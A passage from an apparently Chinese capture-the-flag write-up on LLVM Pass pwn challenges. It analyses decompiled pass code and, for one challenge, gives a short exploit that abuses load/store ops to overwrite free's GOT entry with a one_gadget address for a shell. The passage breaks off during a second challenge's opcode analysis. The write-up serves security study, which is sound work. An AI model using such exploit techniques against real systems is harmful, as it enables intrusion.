*)s1 = *Name;</span><br><span class="line">    *((_QWORD *)s1 + <span class="number">1</span>) = Name[<span class="number">1</span>];</span><br><span class="line">    *((_QWORD *)s1 + <span class="number">2</span>) = Name[<span class="number">2</span>];</span><br><span class="line">    *((_QWORD *)s1 + <span class="number">3</span>) = Name[<span class="number">3</span>];</span><br></pre></td></tr></table></figure>

<p>第一个if进行了一个对Opcode的判断，判断是否为0x37，查资料可以得知这个llvm指令对应的IR代码是call。也就以为着，这里大循环其实只对函数调用进行处理，其他的一律不关心。接下来申请了一块堆地址拿来储存后面getName获取到的，被<code>o0o0o0o0</code>函数调用的函数的名字，并且只取了前面四个字节。</p>
<p>搞清楚这个之后，后面就是对不同被调用函数的处理了，我们这里以pop函数举例分析：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;pop&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ArgOperand = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">    v32 = <span class="number">0LL</span>;</span><br><span class="line">    v31 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOperand);</span><br><span class="line">    <span class="keyword">if</span> ( v31 )</span><br><span class="line">    &#123;</span><br><span class="line">      ZExtValue = llvm::ConstantInt::getZExtValue(v31);</span><br><span class="line">      <span class="keyword">if</span> ( ZExtValue == <span class="number">1</span> )</span><br><span class="line">        v32 = off_20DFD0;</span><br><span class="line">      <span class="keyword">if</span> ( ZExtValue == <span class="number">2</span> )</span><br><span class="line">        v32 = off_20DFC0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v32 )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = off_20DFD8;</span><br><span class="line">      *v32 = *(_QWORD *)*off_20DFD8;</span><br><span class="line">      *v3 -= <span class="number">8LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>getNumOperands</code>获取的是函数的操作数数量（包括被调用函数本身和其调用参数），这也就意味着pop函数需要1个参数。<code>ArgOperand = llvm::CallBase::getArgOperand(v35, 0);</code>这句是取第一个参数赋值给ArgOperand。后面对这个参数动态类型转换之后进行了一个判断：如果为1，取off_20DFD0，为2则取off_20DFC0赋值给v32。再到后面3句就很好理解了，简单来说，off_20DFD8相当于sp指针，指向了栈顶，现在将栈顶数据弹出给了v32指向的地址，并且sp指针-8。名副其实的pop函数。</p>
<p>简单介绍后面的几个函数解析（下面的选择地址指的是第一个参数是1还是2）：</p>
<ul>
<li>push：选择一个地址的数据压栈</li>
<li>store：选择一个地址，将另一个地址指向的地址赋值给自己指向的地址</li>
<li>load：选择一个地址，将自己指向的地址的数据赋值给另一个地址（是有点绕，自己分析可能还清晰点）</li>
<li>add：两个参数，选择一个地址，并将数据加上第二个参数</li>
<li>min：两个参数，选择一个地址，并将数据减去第二个参数</li>
</ul>
<p>那其实有这些指令之后思路还算比较清晰：</p>
<ol>
<li>利用add将1赋值为got表地址</li>
<li>利用load取出1中got表指向的地址，拿到libc地址，存到2中</li>
<li>将2加减一定偏移，使得该地址成为ogg的真实地址</li>
<li>利用store将2中的ogg地址写回到1也就是got表中</li>
<li>等到程序执行到那个got表函数，自然而然就可以拿到shell了</li>
</ol>
<p>所以其实load函数是一个任意地址读，store是任意地址写。不难注意到在处理完被调用函数之后程序调用了一次free，所以我们选择free的got表进行劫持。</p>
<p>free的got表在opt程序中的偏移是0x77E100。</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> num, <span class="type">int</span> val)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">min</span><span class="params">(<span class="type">int</span> num, <span class="type">int</span> val)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">load</span><span class="params">(<span class="type">int</span> num)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">store</span><span class="params">(<span class="type">int</span> num)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	add(<span class="number">1</span>, <span class="number">0x77E100</span>);</span><br><span class="line">	load(<span class="number">1</span>);</span><br><span class="line">	min(<span class="number">2</span>, <span class="number">0x9a6d0</span>);</span><br><span class="line">	add(<span class="number">2</span>, <span class="number">0xe3afe</span>);</span><br><span class="line">	add(<span class="number">1</span>, <span class="number">0x870</span>);</span><br><span class="line">	store(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clang -emit-llvm -S exp.c -o exp.ll</span><br><span class="line">./opt -load ./VMPass.so -VMPass exp.ll</span><br></pre></td></tr></table></figure>



<h2 id="源鲁杯2024-show-me-the-code"><a href="#源鲁杯2024-show-me-the-code" class="headerlink" title="源鲁杯2024 show_me_the_code"></a>源鲁杯2024 show_me_the_code</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><h4 id="获取正确函数名"><a href="#获取正确函数名" class="headerlink" title="获取正确函数名"></a>获取正确函数名</h4><p>老方法，先定位到runOnFunction，这道题好在他没有抹掉符号表，可以直接找到。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall `anonymous namespace<span class="number">&#x27;</span>::c0oo0o0Ode::runOnFunction(</span><br><span class="line">        _anonymous_namespace_::c0oo0o0Ode *this,</span><br><span class="line">        llvm::Function *a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+Fh] [rbp-51h]</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line">  __int64 v6[<span class="number">2</span>]; <span class="comment">// [rsp+30h] [rbp-30h] BYREF</span></span><br><span class="line">  __int64 Name; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  llvm::Value *v9; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line">  _anonymous_namespace_::c0oo0o0Ode *v10; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = this;</span><br><span class="line">  v9 = a2;</span><br><span class="line">  secret::init(this);</span><br><span class="line">  Name = llvm::Value::getName(a2);</span><br><span class="line">  v8 = v2;</span><br><span class="line">  VMDatProt::getStrFromProt2(v5, &amp;`anonymous namespace<span class="number">&#x27;</span>::vmFuncName[abi:cxx11], &amp;secret::vmKey[abi:cxx11]);</span><br><span class="line">  llvm::StringRef::StringRef(v6, v5);</span><br><span class="line">  v4 = llvm::operator==(Name, v8, v6[<span class="number">0</span>], v6[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v5);</span><br><span class="line">  <span class="keyword">if</span> ( (v4 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    `anonymous namespace<span class="number">&#x27;</span>::c0oo0o0Ode::vmRun(this, v9);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是一个定义在匿名命名空间的函数，中间应该是进行了一些解密的操作，然后将解密出来的字符串和传入的函数名对比，如果相等则执行vmRun函数。所以vmRun应该才是核心函数。但是在这之前，我们先用动调将正确的函数名称找出来。</p>
<p><img src="https://c-lby.top/images/first_llvm_pass_pwn/yl-%E6%AD%A3%E7%A1%AE%E7%9A%84%E5%87%BD%E6%95%B0%E5%90%8D%E7%A7%B0.png" alt="yl-正确的函数名称"></p>
<p>正确函数名是<code>_Z10c0deVmMainv</code>。</p>
<h4 id="opcode分析"><a href="#opcode分析" class="headerlink" title="opcode分析"></a>opcode分析</h4><p>接下来就该看vmRun函数了。核心逻辑识别8种指令：op1-op8。</p>
<p><img src="https://c-lby.top/images/first_llvm_pass_pwn/yl-vmRun%E4%B8%BB%E9%80%BB%E8%BE%91.png" alt="yl-vmRun主逻辑"></p>
<p>每个if都会执行一遍isValidOp，这个函数和runonfunction差不多，也是解密比较函数名字，也就是说，这里要动调确定每个op的函数名。</p>
<p><img src="https://c-lby.top/images/first_llvm_pass_pwn/yl-op1.png" alt="yl-op1"></p>
<p>op1的名称是<code>_ZN4edoc4addiEhii</code>。。。以此类推。如果某个被调用的函数符合名称，那么就会进到一个<code>isValidEnv</code>函数进行检查。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall `anonymous namespace<span class="number">&#x27;</span>::c0oo0o0Ode::isValidEnv(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 Type; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+7h] [rbp-C9h]</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">32</span>]; <span class="comment">// [rsp+8h] [rbp-C8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">8</span>]; <span class="comment">// [rsp+28h] [rbp-A8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">32</span>]; <span class="comment">// [rsp+30h] [rbp-A0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v9[<span class="number">32</span>]; <span class="comment">// [rsp+50h] [rbp-80h] BYREF</span></span><br><span class="line">  __int64 v10[<span class="number">2</span>]; <span class="comment">// [rsp+70h] [rbp-60h] BYREF</span></span><br><span class="line">  __int64 StructName; <span class="comment">// [rsp+80h] [rbp-50h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+88h] [rbp-48h]</span></span><br><span class="line">  llvm::Type *v13; <span class="comment">// [rsp+90h] [rbp-40h]</span></span><br><span class="line">  llvm::Type *ElementType; <span class="comment">// [rsp+98h] [rbp-38h]</span></span><br><span class="line">  llvm::PointerType *v15; <span class="comment">// [rsp+A0h] [rbp-30h]</span></span><br><span class="line">  llvm::Value *ArgOperand; <span class="comment">// [rsp+A8h] [rbp-28h]</span></span><br><span class="line">  llvm::CallBase *v17; <span class="comment">// [rsp+B0h] [rbp-20h]</span></span><br><span class="line">  __int64 v18; <span class="comment">// [rsp+B8h] [rbp-18h]</span></span><br><span class="line">  __int64 v19; <span class="comment">// [rsp+C0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> v20; <span class="comment">// [rsp+CFh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  v19 = a1;</span><br><span class="line">  v18 = a2;</span><br><span class="line">  v17 = (llvm::CallBase *)llvm::dyn_cast&lt;llvm::CallInst,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">true</span>&gt;&gt;(a2);</span><br><span class="line">  <span class="keyword">if</span> ( !v17 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  ArgOperand = (llvm::Value *)llvm::CallBase::getArgOperand(v17, <span class="number">0</span>);</span><br><span class="line">  Type = llvm::Value::getType(ArgOperand);</span><br><span class="line">  v15 = (llvm::PointerType *)llvm::dyn_cast&lt;llvm::PointerType,llvm::Type&gt;(Type);</span><br><span class="line">  <span class="keyword">if</span> ( !v15 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  ElementType = (llvm::Type *)llvm::PointerType::getElementType(v15);</span><br><span class="line">  <span class="keyword">if</span> ( (llvm::Type::isStructTy(ElementType) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  v13 = (llvm::Type *)llvm::cast&lt;llvm::StructType,llvm::Type&gt;(ElementType);</span><br><span class="line">  StructName = llvm::Type::getStructName(v13);</span><br><span class="line">  v12 = v3;</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::allocator(v7);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string(v8, <span class="string">&quot;class.&quot;</span>, v7);</span><br><span class="line">  VMDatProt::getStrFromProt2(</span><br><span class="line">    (__int64)v6,</span><br><span class="line">    (__int64)&amp;`anonymous namespace<span class="number">&#x27;</span>::vmEnvName[abi:cxx11],</span><br><span class="line">    (__int64)&amp;secret::vmKey[abi:cxx11]);</span><br><span class="line">  <span class="built_in">std</span>::operator+&lt;<span class="type">char</span>&gt;(v9, v8, v6);</span><br><span class="line">  llvm::StringRef::StringRef(v10, v9);</span><br><span class="line">  v5 = llvm::operator==(StructName, v12, v10[<span class="number">0</span>], v10[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v9);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v6);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v8);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::~allocator(v7);</span><br><span class="line">  <span class="keyword">if</span> ( (v5 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    v20 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">LABEL_6:</span><br><span class="line">    v20 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v20 &amp; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>检查了参数类型，要求第一个参数一定是<code>struct *</code>类型的，并且还要求这个结构体是class.edoc。这里的edoc是动调解密得到的。这个名字有点奇怪，因为他是IR代码的表现形式。实际上在cpp当中，这个class.edoc就意味着:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">edoc</span>&#123;  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这个class似乎并没有什么用，但是调用那些op还必须得有，就是纯纯恶心人的设置。</p>
<p>然后我们来分析op1：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall `anonymous namespace<span class="number">&#x27;</span>::c0oo0o0Ode::op1(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  llvm::Type *Type; <span class="comment">// rax</span></span><br><span class="line">  llvm::Type *v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  llvm::ConstantInt *v7; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  llvm::ConstantInt *v8; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  llvm::Value *ArgOperand; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v11[<span class="number">2</span>]; <span class="comment">// [rsp+2Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 ZExtValue; <span class="comment">// [rsp+37h] [rbp-19h]</span></span><br><span class="line">  llvm::CallBase *v13; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v15 = a1;</span><br><span class="line">  v14 = a2;</span><br><span class="line">  result = llvm::dyn_cast&lt;llvm::CallInst,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">true</span>&gt;&gt;(a2);</span><br><span class="line">  v13 = (llvm::CallBase *)result;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::getNumArgOperands(v13); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      ArgOperand = (llvm::Value *)llvm::CallBase::getArgOperand(v13, i);</span><br><span class="line">      Type = (llvm::Type *)llvm::Value::getType(ArgOperand);</span><br><span class="line">      <span class="keyword">if</span> ( (llvm::Type::isIntegerTy(Type, <span class="number">8u</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> &amp;&amp; i == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOperand);</span><br><span class="line">        <span class="keyword">if</span> ( v8 )</span><br><span class="line">          ZExtValue = llvm::ConstantInt::getZExtValue(v8);</span><br><span class="line">      &#125;</span><br><span class="line">      v4 = (llvm::Type *)llvm::Value::getType(ArgOperand);</span><br><span class="line">      <span class="keyword">if</span> ( (llvm::Type::isIntegerTy(v4) &amp; <span class="number">1</span>) != <span class="number">0</span> &amp;&amp; i &gt; <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOperand);</span><br><span class="line">        <span class="keyword">if</span> ( v7 )</span><br><span class="line">          v11[i - <span class="number">2</span>] = llvm::ConstantInt::getZExtValue(v7);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    result = ZExtValue;</span><br><span class="line">    <span class="keyword">if</span> ( ZExtValue &lt;= <span class="number">5u</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = (<span class="type">unsigned</span> <span class="type">int</span>)(v11[<span class="number">1</span>] + v11[<span class="number">0</span>]);</span><br><span class="line">      *(_QWORD *)<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">unsigned</span> <span class="type">long</span>&gt;::operator[](&amp;secret::regs, ZExtValue) = v6;</span><br><span class="line">      v5 = llvm::errs((llvm *)&amp;secret::regs);</span><br><span class="line">      <span class="keyword">return</span> llvm::raw_ostream::operator&lt;&lt;(v5, <span class="string">&quot;Op1 done.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要求第二个参数是8位int类型的。然后后面的参数是int类型的，这些int参数被存到了v11数组中。可以发现这个v11数组只有2个数的空间而已，但是又没有限制参数数量，这里有个溢出的嫌疑。到了下面，限制了int8的数据要小于等于5，然后会将第二第三参数相加，存到regs[int8偏移]中。根据这些信息，我们可以先把op1的声明写出来<code>void _ZN4edoc4addiEhii(edoc *op, int8_t idx, int num1, int num2);</code>。。。以此类题分析出8个op。</p>
<p>经过折磨的动调和分析，我们可以得到以下脚本：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">edoc</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// op1</span></span><br><span class="line"><span class="comment">// idx&lt;=5</span></span><br><span class="line"><span class="comment">// regs[idx]=num1+num2</span></span><br><span class="line"><span class="type">void</span> _ZN4edoc4addiEhii(edoc *op, <span class="type">int8_t</span> idx, <span class="type">int</span> num1, <span class="type">int</span> num2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// op2</span></span><br><span class="line"><span class="comment">// idx&lt;=5 &amp;&amp; -0x1000&lt;num&lt;0x1000 &amp;&amp; isUsed[0]==0</span></span><br><span class="line"><span class="comment">// use_once</span></span><br><span class="line"><span class="comment">// regs[idx]+=num</span></span><br><span class="line"><span class="type">void</span> _ZN4edoc4chgrEhi(edoc *op, <span class="type">int8_t</span> idx, <span class="type">int</span> num);</span><br><span class="line"></span><br><span class="line"><span class="comment">// op3</span></span><br><span class="line"><span class="comment">// idx&lt;=5 &amp;&amp; offset&lt;0x40</span></span><br><span class="line"><span class="comment">// choice==0: regs[idx]&gt;&gt;=offset</span></span><br><span class="line"><span class="comment">// choice==1: regs[idx]&lt;&lt;=offset</span></span><br><span class="line"><span class="type">void</span> _ZN4edoc4sftrEhbh(edoc *op, <span class="type">int8_t</span> idx, <span class="type">bool</span> choice, <span class="type">int8_t</span> offset);</span><br><span class="line"></span><br><span class="line"><span class="comment">// op4</span></span><br><span class="line"><span class="comment">// idx1&lt;=5 &amp;&amp; idx2&lt;=5 &amp;&amp; idx3&lt;=5</span></span><br><span class="line"><span class="comment">// regs[idx1] = regs[idx3] | regs[idx2]</span></span><br><span class="line"><span class="type">void</span> _ZN4edoc4borrEhhh(edoc *op, <span class="type">int8_t</span> idx1, <span class="type">int8_t</span> idx2, <span class="type">int8_t</span> idx3);</span><br><span class="line"></span><br><span class="line"><span class="comment">// op5</span></span><br><span class="line"><span class="comment">// idx1&lt;8 &amp;&amp; idx2&lt;8</span></span><br><span class="line"><span class="comment">// regs[idx1] = regs[idx2]</span></span><br><span class="line"><span class="type">void</span> _ZN4edoc4movrEhh(edoc *op, <span class="type">int8_t</span> idx1, <span class="type">int8_t</span> idx2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// op6</span></span><br><span class="line"><span class="comment">// idx&lt;=5 &amp;&amp; num&lt;=0x1000 &amp;&amp; num&amp;7==0 &amp;&amp; regs[6]&amp;0xfff==0 &amp;&amp; regs[7]==regs[6]+0x1000</span></span><br><span class="line"><span class="comment">//*(regs[6]+num) = regs[idx]  //?</span></span><br><span class="line"><span class="type">void</span> _ZN4edoc4saveEhj(edoc *op, <span class="type">int8_t</span> idx, <span class="type">int</span> num);</span><br><span class="line"></span><br><span class="line"><span class="comment">// op7</span></span><br><span class="line"><span class="comment">// idx&lt;=5 &amp;&amp; num&lt;=0x1000 &amp;&amp; num&amp;7==0 &amp;&amp; regs[6]&amp;0xfff==0 &amp;&amp; regs[7]==regs[6]+0x1000</span></span><br><span class="line"><span class="comment">// regs[idx] = *(regs[6]+num)</span></span><br><span class="line"><span class="type">void</span> _ZN4edoc4loadEhj(edoc *op, <span class="type">int8_t</span> idx, <span class="type">int</span> num);</span><br><span class="line"></span><br><span class="line"><span class="comment">// op8</span></span><br><span class="line"><span class="comment">// idx&lt;=5 &amp;&amp; num&lt;=0x1000 &amp;&amp; num&amp;7==0 &amp;&amp; regs[6]&amp;0xfff==0 &amp;&amp; regs[7]==regs[6]+0x1000</span></span><br><span class="line"><span class="comment">//*(regs[6]+num)(regs[idx])   //break</span></span><br><span class="line"><span class="type">void</span> _ZN4edoc4runcEhj(edoc *op, <span class="type">int8_t</span> idx, <span class="type">int</span> num);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _Z10c0deVmMainv()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>num&amp;7&#x3D;&#x3D;0意味着低三位为0。regs[6]&amp;0xfff=&#x3D;0意味着低1.5个字节要为0。op8这个函数指针太显眼了。接下来该思考如果getshell了。</p>
